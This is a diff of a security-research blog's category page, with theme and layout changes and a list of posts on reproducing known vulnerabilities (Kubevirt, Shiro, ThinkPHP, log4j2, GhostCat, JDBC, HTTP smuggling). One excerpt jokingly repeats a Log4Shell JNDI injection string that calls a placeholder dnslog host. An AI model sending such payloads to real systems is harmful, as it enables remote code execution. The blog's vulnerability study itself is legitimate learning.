@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto">
+<html lang="en" dir="auto" data-theme="auto">
 
 <head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -10,7 +10,7 @@
 <meta name="description" content="">
 <meta name="author" content="">
 <link rel="canonical" href="https://dragonbox.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css" integrity="sha256-IhHKMWS&#43;eDACT2qtKzouUghDpk&#43;PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://dragonbox.top/flash.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://dragonbox.top/flash.ico">
 <link rel="icon" type="image/png" sizes="32x32" href="https://dragonbox.top/flash.ico">
@@ -18,7 +18,7 @@
 <link rel="mask-icon" href="https://dragonbox.top/flash.ico">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" type="application/rss+xml" href="https://dragonbox.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/index.xml">
+<link rel="alternate" type="application/rss+xml" href="https://dragonbox.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/index.xml" title="rss">
 <link rel="alternate" hreflang="en" href="https://dragonbox.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">
 <noscript>
     <style>
@@ -40,23 +40,38 @@
                 --code-block-bg: rgb(46, 46, 51);
                 --code-bg: rgb(55, 56, 62);
                 --border: rgb(51, 51, 51);
+                color-scheme: dark;
             }
 
             .list {
                 background: var(--theme);
             }
 
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
+            .toc {
+                background: var(--entry);
             }
+        }
 
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
             }
         }
 
     </style>
-</noscript><meta property="og:url" content="https://dragonbox.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://dragonbox.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">
   <meta property="og:site_name" content="ch4ser の 超元域">
   <meta property="og:title" content="安全研究">
   <meta property="og:locale" content="en-us">
@@ -66,20 +81,8 @@
 <meta name="twitter:description" content="">
 
 </head>
-
 <body class="list" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
+    <header class="header">
     <nav class="nav">
         <div class="logo">
             <a href="https://dragonbox.top/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
@@ -115,6 +118,11 @@
                 </a>
             </li>
             <li>
+                <a href="https://dragonbox.top/friends/" title="friends">
+                    <span>friends</span>
+                </a>
+            </li>
+            <li>
                 <a href="https://dragonbox.top/about/" title="about">
                     <span>about</span>
                 </a>
@@ -138,7 +146,7 @@
     <p>该漏洞是论文工作 “Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications” 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2024-04-30 20:29:05 +0800 CST'>April 30, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;284 words</footer>
+  <footer class="entry-footer"><span title='2024-04-30 20:29:05 +0800 CST'>April 30, 2024</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>284 words</span></footer>
   <a class="entry-link" aria-label="post link to CVE-2023-26484 Kubevirt 权限提升漏洞复现" href="https://dragonbox.top/posts/sec-cve-2023-26484/"></a>
 </article>
 
@@ -151,7 +159,7 @@
     <p> 记录shiro漏洞学习的过程, 参考https://saucer-man.com/information_security/396.html, 并在漏洞分析基础上编写检测脚本
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2022-01-22 10:52:46 +0000 UTC'>January 22, 2022</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;713 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2022-01-22 10:52:46 +0000 UTC'>January 22, 2022</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>713 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to shiro 漏洞复现" href="https://dragonbox.top/posts/sec-shiro-attack/"></a>
 </article>
 
@@ -164,7 +172,7 @@
     <p> phpggc中关于thinkphp的攻击思路学习
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2022-01-14 22:19:13 +0000 UTC'>January 14, 2022</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;378 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2022-01-14 22:19:13 +0000 UTC'>January 14, 2022</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>378 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to thinkphp5漏洞学习" href="https://dragonbox.top/posts/sec-phpggc-thinkphp/"></a>
 </article>
 
@@ -177,7 +185,7 @@
     <p> 明天安全圈校招面试: 面试官: 请说说你会什么技能? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 面试官: 请说说你最近关注过的漏洞? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 面试官: 你平时有动手调试过吗? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 我：这dnslog是不是卡了 这面试官怎么还没rce
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2021-12-11 14:56:51 +0000 UTC'>December 11, 2021</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;77 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2021-12-11 14:56:51 +0000 UTC'>December 11, 2021</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>77 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to log4j2 jndi 漏洞学习和调试" href="https://dragonbox.top/posts/sec-log4j2-jndi/"></a>
 </article>
 
@@ -190,7 +198,7 @@
     <p> 本文主要参考 https://blog.csdn.net/qq_31481187/article/details/105917392 和 https://paper.seebug.org/1142/#_6 ，并无原创内容，仅仅是个人学习笔记。
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2021-11-13 13:14:29 +0000 UTC'>November 13, 2021</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;243 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2021-11-13 13:14:29 +0000 UTC'>November 13, 2021</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>243 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to GhostCat(CVE-2020-1938)漏洞学习" href="https://dragonbox.top/posts/sec-ghostcat/"></a>
 </article>
 
@@ -203,7 +211,7 @@
     <p> 我终于更新博客了……
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2021-10-15 21:46:28 +0000 UTC'>October 15, 2021</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;815 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2021-10-15 21:46:28 +0000 UTC'>October 15, 2021</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>815 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to mysql jdbc反序列化的不深入研究" href="https://dragonbox.top/posts/sec-jdbc-unserialize/"></a>
 </article>
 
@@ -216,7 +224,7 @@
     <p>正常的请求
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2020-08-24 22:22:46 +0000 UTC'>August 24, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;319 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2020-08-24 22:22:46 +0000 UTC'>August 24, 2020</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>319 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to http请求走私笔记" href="https://dragonbox.top/posts/sec-http-smuggling/"></a>
 </article>
 
@@ -229,13 +237,13 @@
     <p>php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2019-09-02 13:40:59 +0000 UTC'>September 2, 2019</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;369 words&nbsp;·&nbsp;ch4ser</footer>
+  <footer class="entry-footer"><span title='2019-09-02 13:40:59 +0000 UTC'>September 2, 2019</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>369 words</span>&nbsp;·&nbsp;<span>ch4ser</span></footer>
   <a class="entry-link" aria-label="post link to php session反序列化" href="https://dragonbox.top/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"></a>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
+        <span>&copy; 2026 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
 
     <span>
         Powered by
@@ -250,9 +258,14 @@
 </a>
 
 <script>
-    let menu = document.getElementById('menu')
+    let menu = document.getElementById('menu');
     if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
         menu.onscroll = function () {
             localStorage.setItem("menu-scroll-position", menu.scrollLeft);
         }
@@ -293,11 +306,12 @@
 </script>
 <script>
     document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
             localStorage.setItem("pref-theme", 'light');
         } else {
-            document.body.classList.add('dark');
+            html.dataset.theme = 'dark';
             localStorage.setItem("pref-theme", 'dark');
         }
     })
